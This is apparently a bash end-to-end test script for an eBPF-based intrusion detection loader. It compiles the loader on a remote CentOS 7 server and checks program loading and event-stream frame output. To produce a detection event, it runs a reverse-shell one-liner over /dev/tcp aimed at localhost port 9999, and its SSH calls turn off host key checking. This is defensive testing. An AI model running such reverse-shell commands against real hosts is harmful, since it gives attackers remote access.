#!/usr/bin/env bash
# =============================================================================
# E2.4 — ECS (3.10 stock kernel) 端到端验证脚本
# 验证 NOBTF 方案完整链路:
#   上传 hrabnaz_main_ancient_nobtf.o + hrabnaz_loader.c → 远程 gcc 编译
#   → --load-only 验证 13/13 加载 → --stream 验证事件帧输出
#
# 目标 ECS: CentOS 7.2, kernel 3.10.0-1160.119.1.el7.x86_64, glibc 2.17 (无 BTF)
# ECS glibc 太旧无法直接跑 Rust 二进制, 故端到端 Rust 链路在本地用 mock 子进程验证
# (参考 cloader_source.rs::tests 13 个单元测试); 本脚本只验证 hrabnaz_loader 端的帧输出.
#
# 退出码:
#   0 — 全部断言通过
#   1 — 断言失败（已打印诊断信息）
#   2 — SSH 不可达 / ECS 连接失败
#   3 — 本地产物缺失 (hrabnaz_main_ancient_nobtf.o 或 hrabnaz_loader.c)
#   4 — 远程 gcc 编译失败
# =============================================================================
set -euo pipefail

# ── 常量 ────────────────────────────────────────────────────────────────────
# 连接信息改由环境变量注入：旧实现把本机私钥绝对路径与服务器 IP 硬编码进仓库
readonly SSH_KEY="${HRABNAZ_E2E_SSH_KEY:?请设置 HRABNAZ_E2E_SSH_KEY=/path/to/key}"
readonly ECS_HOST="${HRABNAZ_E2E_HOST:?请设置 HRABNAZ_E2E_HOST=<服务器IP>}"
readonly ECS_USER="${HRABNAZ_E2E_USER:-root}"
readonly REMOTE_DIR="/tmp/ks-e2e"
readonly HRABNAZ_LOADER_SRC_REL="crates/hrabnaz-ebpf/scripts/hrabnaz_loader.c"
readonly OBJ_NAME="hrabnaz_main_ancient_nobtf.o"
readonly REMOTE_LOADER="${REMOTE_DIR}/hrabnaz_loader"
readonly REMOTE_OBJ="${REMOTE_DIR}/${OBJ_NAME}"
readonly REMOTE_LOADER_SRC="${REMOTE_DIR}/hrabnaz_loader.c"
readonly REMOTE_STREAM_OUT="${REMOTE_DIR}/stream.out"
readonly REMOTE_STREAM_ERR="${REMOTE_DIR}/stream.err"
readonly REMOTE_STREAM_PID="${REMOTE_DIR}/stream.pid"

# 时序常量 (秒)
readonly STREAM_WARMUP_SEC=2      # stream 启动后等待 perfbuf 就绪
readonly TRIGGER_DELAY_SEC=2      # 触发反弹 shell 后等待事件入队
readonly DIGEST_WAIT_SEC=3        # 让事件消化后采集
readonly SSH_CONNECT_TIMEOUT=10

# 退出码
readonly EXIT_OK=0
readonly EXIT_ASSERT=1
readonly EXIT_SSH=2
readonly EXIT_NO_ARTIFACT=3
readonly EXIT_COMPILE=4

# ── 项目根目录（脚本所在目录的上一级）──────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
HRABNAZ_LOADER_SRC_LOCAL="${PROJECT_ROOT}/${HRABNAZ_LOADER_SRC_REL}"

# ── 运行态 ────────────────────────────────────────────────────────────────────
OBJ_PATH=""                # 本地 hrabnaz_main_ancient_nobtf.o 绝对路径 (find_ancient_nobtf_object 填充)
REMOTE_STREAM_PID_VAL=""   # 远程 stream 进程 pid (start_stream 填充)

# ── 日志 / 失败函数 ───────────────────────────────────────────────────────────
log() {
    echo "[E2.4] $*"
}

warn() {
    echo "[E2.4] [WARN] $*" >&2
}

fail() {
    echo "============================================================" >&2
    echo "ASSERT FAILED: $1" >&2
    echo "------------------------------------------------------------" >&2
    # 远程诊断: 仅当远程目录存在时拉取 stream.err / stream.out
    if ssh_run "test -d ${REMOTE_DIR}" 2>/dev/null; then
        echo ">>> remote ${REMOTE_STREAM_ERR} (tail 30):" >&2
        ssh_run "tail -30 ${REMOTE_STREAM_ERR} 2>/dev/null" 2>&1 | head -30 >&2 || true
        echo ">>> remote ${REMOTE_STREAM_OUT} (size + head hex):" >&2
        ssh_run "wc -c ${REMOTE_STREAM_OUT} 2>/dev/null; od -An -tx1 -N 64 ${REMOTE_STREAM_OUT} 2>/dev/null" 2>&1 | head -10 >&2 || true
        echo ">>> remote loader --load-only stderr 重跑 (前 20 行):" >&2
        ssh_run "${REMOTE_LOADER} --load-only ${REMOTE_OBJ} 2>&1 | head -20" 2>&1 | head -20 >&2 || true
    fi
    echo "============================================================" >&2
    exit "${EXIT_ASSERT}"
}

# ── SSH 封装 ─────────────────────────────────────────────────────────────────
# 注意: StrictHostKeyChecking=no + UserKnownHostsFile=/dev/null 避免首次连接交互提示
ssh_run() {
    ssh -i "${SSH_KEY}" \
        -o PubkeyAcceptedAlgorithms=+ssh-rsa \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout="${SSH_CONNECT_TIMEOUT}" \
        "${ECS_USER}@${ECS_HOST}" "$@"
}

scp_upload() {
    # 用法: scp_upload <local_path> <remote_path>
    scp -i "${SSH_KEY}" \
        -o PubkeyAcceptedAlgorithms=+ssh-rsa \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout="${SSH_CONNECT_TIMEOUT}" \
        "$1" "${ECS_USER}@${ECS_HOST}:$2"
}

# ── 清理函数: trap EXIT 调用 ──────────────────────────────────────────────────
cleanup() {
    local code=$?
    # 终止远程 stream 进程 (若有 pid 记录)
    if [[ -n "${REMOTE_STREAM_PID_VAL:-}" ]]; then
        log "[cleanup] 终止远程 hrabnaz_loader stream (pid=${REMOTE_STREAM_PID_VAL})..."
        # 先 SIGTERM 优雅退出 (hrabnaz_loader 注册了 SIGTERM handler 会 detach + 退出 0)
        ssh_run "kill ${REMOTE_STREAM_PID_VAL} 2>/dev/null" 2>/dev/null || true
        sleep 0.5
        ssh_run "kill -9 ${REMOTE_STREAM_PID_VAL} 2>/dev/null" 2>/dev/null || true
    fi
    # 远程清理目录
    if [[ "${code}" -ne "${EXIT_SSH}" ]]; then
        # SSH 不可达时不浪费时间尝试 (会再触发超时)
        log "[cleanup] 远程清理 ${REMOTE_DIR}"
        ssh_run "rm -rf ${REMOTE_DIR} 2>/dev/null" 2>/dev/null || true
    fi
    exit "${code}"
}
trap cleanup EXIT

# =============================================================================
# E2.4.1 — SSH 探活 + libelf-devel 检测
# =============================================================================
check_ssh_and_deps() {
    log "[E2.4.1] SSH 探活 ${ECS_USER}@${ECS_HOST} ..."
    if ! ssh_run "echo ok; uname -r; cat /etc/redhat-release 2>/dev/null || cat /etc/os-release 2>/dev/null | head -3" \
            > /tmp/ks-e2e-ping.out 2>/tmp/ks-e2e-ping.err; then
        echo "============================================================" >&2
        echo "ERROR: SSH 连接失败 (exit=$?)" >&2
        echo "       ECS: ${ECS_USER}@${ECS_HOST}" >&2
        echo "       Key: ${SSH_KEY}" >&2
        echo ">>> ssh stderr:" >&2
        cat /tmp/ks-e2e-ping.err >&2 || true
        echo "============================================================" >&2
        rm -f /tmp/ks-e2e-ping.out /tmp/ks-e2e-ping.err
        exit "${EXIT_SSH}"
    fi
    log "         SSH ok, 远程 uname: $(head -2 /tmp/ks-e2e-ping.out | tail -1)"
    rm -f /tmp/ks-e2e-ping.out /tmp/ks-e2e-ping.err

    # 检测 libelf-devel (gcc 编译 hrabnaz_loader.c 需要 elf.h + libelf.so)
    log "         检测 libelf-devel ..."
    if ! ssh_run "pkg-config --exists libelf 2>/dev/null || test -f /usr/include/libelf.h && test -f /usr/lib64/libelf.so"; then
        log "         libelf-devel 缺失, 安装中 (yum install -y libelf-devel) ..."
        if ! ssh_run "yum install -y libelf-devel" >/tmp/ks-e2e-yum.out 2>/tmp/ks-e2e-yum.err; then
            echo "ERROR: yum install libelf-devel 失败" >&2
            cat /tmp/ks-e2e-yum.err >&2 || true
            rm -f /tmp/ks-e2e-yum.out /tmp/ks-e2e-yum.err
            exit "${EXIT_SSH}"
        fi
        log "         libelf-devel 安装完成"
        rm -f /tmp/ks-e2e-yum.out /tmp/ks-e2e-yum.err
    else
        log "         libelf-devel 已安装"
    fi
}

# =============================================================================
# E2.4.2 — 查找本地产物 + 上传到 ECS /tmp/ks-e2e/
# =============================================================================
# 模拟 event_source.rs::find_ancient_nobtf_object 的查找逻辑:
#   1. 环境变量 HRABNAZ_EBPF_DIR + hrabnaz_main_ancient_nobtf.o
#   2. target/{debug,release}/build/hrabnaz-engine-*/out/hrabnaz_main_ancient_nobtf.o (取最新)
find_local_artifact() {
    if [[ -z "${HRABNAZ_EBPF_DIR:-}" ]]; then
        HRABNAZ_EBPF_DIR=""
    fi
    local env_path="${HRABNAZ_EBPF_DIR}/${OBJ_NAME}"
    if [[ -n "${HRABNAZ_EBPF_DIR}" && -f "${env_path}" ]]; then
        OBJ_PATH="${env_path}"
        log "[E2.4.2] 使用 HRABNAZ_EBPF_DIR: ${OBJ_PATH}"
        return 0
    fi

    log "[E2.4.2] 查找 target/{debug,release}/build/hrabnaz-engine-*/out/${OBJ_NAME} ..."
    local candidates=()
    local f
    # nullglob 让通配无匹配时返回空数组而非字面 pattern
    shopt -s nullglob
    for tier in release debug; do
        for f in "${PROJECT_ROOT}/target/${tier}/build/hrabnaz-engine-"*/out/${OBJ_NAME}; do
            candidates+=("${f}")
        done
    done
    shopt -u nullglob

    if (( ${#candidates[@]} == 0 )); then
        echo "============================================================" >&2
        echo "ERROR: 找不到 ${OBJ_NAME}" >&2
        echo "       已查找:" >&2
        echo "         - HRABNAZ_EBPF_DIR=${HRABNAZ_EBPF_DIR:-<unset>}/${OBJ_NAME}" >&2
        echo "         - ${PROJECT_ROOT}/target/{debug,release}/build/hrabnaz-engine-*/out/${OBJ_NAME}" >&2
        echo "       请先运行: cargo build --release -p hrabnaz-engine" >&2
        echo "============================================================" >&2
        exit "${EXIT_NO_ARTIFACT}"
    fi

    # 取 mtime 最新的 (模拟 Rust glob + sort by mtime)
    local newest="${candidates[0]}"
    for f in "${candidates[@]:1}"; do
        if [[ "${f}" -nt "${newest}" ]]; then
            newest="${f}"
        fi
    done
    OBJ_PATH="${newest}"
    log "         找到 ${#candidates[@]} 份, 取最新: ${OBJ_PATH}"
}

upload_artifacts() {
    # 校验本地 hrabnaz_loader.c 存在
    if [[ ! -f "${HRABNAZ_LOADER_SRC_LOCAL}" ]]; then
        echo "============================================================" >&2
        echo "ERROR: 找不到 hrabnaz_loader.c: ${HRABNAZ_LOADER_SRC_LOCAL}" >&2
        echo "============================================================" >&2
        exit "${EXIT_NO_ARTIFACT}"
    fi
    log "[E2.4.2] 远程 mkdir -p ${REMOTE_DIR}"
    ssh_run "mkdir -p ${REMOTE_DIR}" || exit "${EXIT_SSH}"

    log "         scp 上传 hrabnaz_loader.c ($(wc -l < "${HRABNAZ_LOADER_SRC_LOCAL}") 行) ..."
    scp_upload "${HRABNAZ_LOADER_SRC_LOCAL}" "${REMOTE_LOADER_SRC}" || exit "${EXIT_SSH}"

    log "         scp 上传 ${OBJ_NAME} ($(wc -c < "${OBJ_PATH}") bytes) ..."
    scp_upload "${OBJ_PATH}" "${REMOTE_OBJ}" || exit "${EXIT_SSH}"

    log "         上传完成"
}

# =============================================================================
# E2.4.3 — 远程 gcc 编译 hrabnaz_loader
# =============================================================================
remote_compile() {
    log "[E2.4.3] 远程 gcc 编译 hrabnaz_loader ..."
    local compile_log
    if ! compile_log=$(ssh_run \
            "gcc -std=c99 -O2 -Wall -Wextra -o ${REMOTE_LOADER} ${REMOTE_LOADER_SRC} -lelf 2>&1"); then
        echo "============================================================" >&2
        echo "ERROR: 远程 gcc 编译失败 (exit=$?)" >&2
        echo ">>> gcc 输出:" >&2
        echo "${compile_log}" >&2
        echo "============================================================" >&2
        exit "${EXIT_COMPILE}"
    fi
    # 校验二进制生成
    if ! ssh_run "test -x ${REMOTE_LOADER}"; then
        echo "ERROR: 编译看似成功但 ${REMOTE_LOADER} 不可执行" >&2
        exit "${EXIT_COMPILE}"
    fi
    # 警告级别 (-Wall -Wextra) 的输出不应导致失败, 但打印出来便于诊断
    if [[ -n "${compile_log}" ]]; then
        warn "gcc 输出 (警告级, 不影响 exit code):"
        echo "${compile_log}" >&2 | head -10
    fi
    log "         编译成功: ${REMOTE_LOADER}"
}

# =============================================================================
# E2.4.4 — --load-only 验证 13/13 加载
# =============================================================================
# 注意: hrabnaz_loader.c 实际输出的成功标记是 "=== Summary: N loaded, 0 failed ==="
# (而非 "attached"; 后者是设计文档用词, 实现里加载成功的 stderr 标记是 "loaded")
# 故断言 stderr 含 "loaded" 且退出码 0; 同时校验 "0 failed" 确认无失败.
verify_load_only() {
    log "[E2.4.4] 远程 --load-only 验证 (期望 13/13 loaded) ..."
    local out rc
    # 注意: set -e 模式下 ssh_run 退出码非 0 不应直接退出, 用 || true 截获
    out=$(ssh_run "${REMOTE_LOADER} --load-only ${REMOTE_OBJ} 2>&1" 2>/dev/null) && rc=0 || rc=$?

    echo "${out}" | sed 's/^/         | /'

    if (( rc != 0 )); then
        echo "============================================================" >&2
        echo "ERROR: --load-only 退出码 ${rc} (期望 0)" >&2
        echo ">>> 完整输出:" >&2
        echo "${out}" >&2
        echo "============================================================" >&2
        exit "${EXIT_ASSERT}"
    fi

    # 断言含 "loaded" + "0 failed" (hrabnaz_loader.c:740 行: "=== Summary: N loaded, N failed ===")
    if ! echo "${out}" | grep -q "loaded"; then
        fail "stderr 不含 'loaded' 标记 (期望: === Summary: N loaded, 0 failed ===)"
    fi
    if ! echo "${out}" | grep -q "0 failed"; then
        fail "stderr 不含 '0 failed' (有程序加载失败)"
    fi
    # 提取 loaded 计数, 期望 >= 13 (13/13 加载成功是已知里程碑)
    local loaded_count
    loaded_count=$(echo "${out}" | grep -oE 'Summary: [0-9]+ loaded' | grep -oE '[0-9]+' | head -1 || echo "0")
    if (( loaded_count < 13 )); then
        fail "loaded 计数 ${loaded_count} < 13 (期望 13/13)"
    fi
    log "         加载验证通过: ${loaded_count}/13 loaded, 0 failed"
}

# =============================================================================
# E2.4.5 — --stream 事件帧输出验证
# =============================================================================
start_stream() {
    log "[E2.4.5] 远程启动 --stream (后台, 写 ${REMOTE_STREAM_OUT}) ..."
    # nohup + </dev/null + >/dev/null 2>&1 & 让 SSH 能立即返回
    # 用 echo $! 捕获 pid 写入文件
    local cmd="cd ${REMOTE_DIR} && nohup ${REMOTE_LOADER} --stream ${REMOTE_OBJ} \
> ${REMOTE_STREAM_OUT} 2> ${REMOTE_STREAM_ERR} </dev/null & echo \$! > ${REMOTE_STREAM_PID}"
    ssh_run "${cmd}" || exit "${EXIT_SSH}"
    # 拉取 pid
    REMOTE_STREAM_PID_VAL=$(ssh_run "cat ${REMOTE_STREAM_PID} 2>/dev/null" 2>/dev/null || echo "")
    if [[ -z "${REMOTE_STREAM_PID_VAL}" ]]; then
        fail "无法获取远程 stream 进程 pid"
    fi
    log "         stream pid=${REMOTE_STREAM_PID_VAL}"
    # 校验进程仍存活 (启动后立即崩溃说明 stream 模式有问题)
    if ! ssh_run "kill -0 ${REMOTE_STREAM_PID_VAL} 2>/dev/null"; then
        echo ">>> ${REMOTE_STREAM_ERR} 末尾 20 行:" >&2
        ssh_run "tail -20 ${REMOTE_STREAM_ERR} 2>/dev/null" >&2 || true
        fail "stream 进程启动后立即退出"
    fi
    log "         stream 进程运行中"
}

trigger_reverse_shell() {
    log "         等待 ${STREAM_WARMUP_SEC}s 让 perfbuf 就绪 ..."
    sleep "${STREAM_WARMUP_SEC}"

    log "         触发反弹 shell (exec bash -i >& /dev/tcp/127.0.0.1/9999) ..."
    # 反弹 shell 会尝试连 127.0.0.1:9999 (无 listener, 必失败), 但 execve syscall
    # 已被 eBPF 探针捕获. nohup + 全重定向让 SSH 立即返回.
    # 用 setsid 让子进程脱离 SSH 的进程组, 避免 SSH 等待.
    if ! ssh_run "setsid bash -c 'exec bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' </dev/null >/dev/null 2>&1 &" \
            >/dev/null 2>&1; then
        warn "反弹 shell 触发命令返回非 0 (可能 SSH 通道关闭, 不影响事件已触发)"
    fi

    log "         等待 ${DIGEST_WAIT_SEC}s 让事件消化 ..."
    sleep "${DIGEST_WAIT_SEC}"
}

verify_stream_output() {
    log "         校验 ${REMOTE_STREAM_OUT} 帧输出 ..."

    # 0) 先确认 stream 进程还活着 (没崩溃)
    if ! ssh_run "kill -0 ${REMOTE_STREAM_PID_VAL} 2>/dev/null"; then
        echo ">>> ${REMOTE_STREAM_ERR} 末尾 30 行:" >&2
        ssh_run "tail -30 ${REMOTE_STREAM_ERR} 2>/dev/null" >&2 || true
        fail "stream 进程在事件采集期间崩溃"
    fi

    # 1) stream.out 文件存在且非空
    local size
    size=$(ssh_run "wc -c < ${REMOTE_STREAM_OUT} 2>/dev/null" 2>/dev/null || echo "0")
    size=$(echo "${size}" | tr -d '[:space:]')
    log "         stream.out size = ${size} bytes"
    if (( size < 4 )); then
        echo ">>> ${REMOTE_STREAM_ERR} 末尾 30 行:" >&2
        ssh_run "tail -30 ${REMOTE_STREAM_ERR} 2>/dev/null" >&2 || true
        fail "stream.out 太小 (${size} < 4 bytes), 未收到任何帧"
    fi

    # 2) 第一个帧的 length 字段 (前 4 字节 LE u32) > 0
    #    (心跳帧 length=0 是 4 个 0x00 字节; 事件帧 length > 0)
    #    注意: hrabnaz_loader HEARTBEAT_INTERVAL_SEC=30, 本脚本只跑 5s 左右, 不会有心跳;
    #          但仍校验 first frame 非心跳, 提高健壮性.
    local first4
    first4=$(ssh_run "od -An -tx1 -N4 ${REMOTE_STREAM_OUT} 2>/dev/null" 2>/dev/null | tr -d '[:space:]' || echo "")
    log "         stream.out 首 4 字节 (hex): ${first4}"
    if [[ -z "${first4}" ]]; then
        fail "无法读取 stream.out 首 4 字节"
    fi
    # 去掉所有 '0' 后若为空, 说明是心跳帧 (4 个 0x00)
    local nonzero
    nonzero=$(echo "${first4}" | tr -d '0')
    if [[ -z "${nonzero}" ]]; then
        echo ">>> stream.out 首 64 字节 hex:" >&2
        ssh_run "od -An -tx1 -N 64 ${REMOTE_STREAM_OUT} 2>/dev/null" >&2 || true
        fail "首帧是心跳帧 (length=0), 未捕获到事件 payload"
    fi

    # 3) 解析首帧 length 字段, 校验 length <= size - 4 (防止声明超过实际数据)
    #    LE u32: 字节序反转后转十进制
    local b1 b2 b3 b4 length_val
    b1=$(echo "${first4}" | cut -c1-2)
    b2=$(echo "${first4}" | cut -c3-4)
    b3=$(echo "${first4}" | cut -c5-6)
    b4=$(echo "${first4}" | cut -c7-8)
    length_val=$(( 16#${b1} + (16#${b2} << 8) + (16#${b3} << 16) + (16#${b4} << 24) ))
    log "         首帧 length 字段 (LE u32) = ${length_val}"
    if (( length_val <= 0 )); then
        fail "首帧 length=${length_val} (期望 > 0)"
    fi
    if (( length_val > size - 4 )); then
        fail "首帧 length=${length_val} 超过 payload 实际容量 (size-4=$(( size - 4 )))"
    fi
    log "         首帧格式校验通过: [length=${length_val}][payload ${length_val} bytes]"

    # 4) stream.err 不含 "FAIL" (hrabnaz_loader.c 失败标记: [FAIL] program=...)
    local err_content
    err_content=$(ssh_run "cat ${REMOTE_STREAM_ERR} 2>/dev/null" 2>/dev/null || echo "")
    if echo "${err_content}" | grep -q "FAIL"; then
        echo ">>> ${REMOTE_STREAM_ERR} 末尾 30 行:" >&2
        echo "${err_content}" | tail -30 >&2
        fail "stream.err 含 'FAIL' 标记 (有程序在 stream 模式下加载失败)"
    fi
    log "         stream.err 不含 FAIL 标记"
}

stop_stream() {
    log "         停止远程 stream 进程 (pid=${REMOTE_STREAM_PID_VAL}) ..."
    # SIGTERM 让 hrabnaz_loader 优雅退出 (注册了 SIGTERM handler, 会 detach + cleanup + exit 0)
    ssh_run "kill ${REMOTE_STREAM_PID_VAL} 2>/dev/null" 2>/dev/null || true
    sleep 0.5
    # 兜底 SIGKILL (若 SIGTERM 未生效)
    ssh_run "kill -9 ${REMOTE_STREAM_PID_VAL} 2>/dev/null" 2>/dev/null || true
    REMOTE_STREAM_PID_VAL=""
}

# =============================================================================
# 主流程
# =============================================================================
main() {
    echo "============================================================"
    echo " Hrabnaz E2.4 验证 (Ancient tier, ECS 3.10 stock kernel, NOBTF)"
    echo " ECS:        ${ECS_USER}@${ECS_HOST}"
    echo " SSH Key:    ${SSH_KEY}"
    echo " Remote Dir: ${REMOTE_DIR}"
    echo " Loader Src: ${HRABNAZ_LOADER_SRC_LOCAL}"
    echo "============================================================"

    find_local_artifact    # E2.4.2 (失败时 exit 3)
    check_ssh_and_deps    # E2.4.1 (失败时 exit 2)
    upload_artifacts       # E2.4.2
    remote_compile         # E2.4.3 (失败时 exit 4)
    verify_load_only      # E2.4.4
    start_stream           # E2.4.5
    trigger_reverse_shell # E2.4.5 (触发反弹 shell)
    verify_stream_output  # E2.4.5 (断言帧格式)
    stop_stream            # E2.4.5 (停止 stream)

    echo "============================================================"
    echo " [E2.4] 全部断言通过 — ECS 端到端验证成功"
    echo "        - 本地产物上传: OK"
    echo "        - 远程 gcc 编译: OK"
    echo "        - --load-only: 13/13 loaded, 0 failed"
    echo "        - --stream: 首帧格式 [length][payload] 校验通过, 无 FAIL"
    echo "        - 反弹 shell 触发事件捕获: OK"
    echo "============================================================"
    # 清理由 trap cleanup EXIT 处理 (会 rm -rf /tmp/ks-e2e/)
    exit "${EXIT_OK}"
}

main "$@"
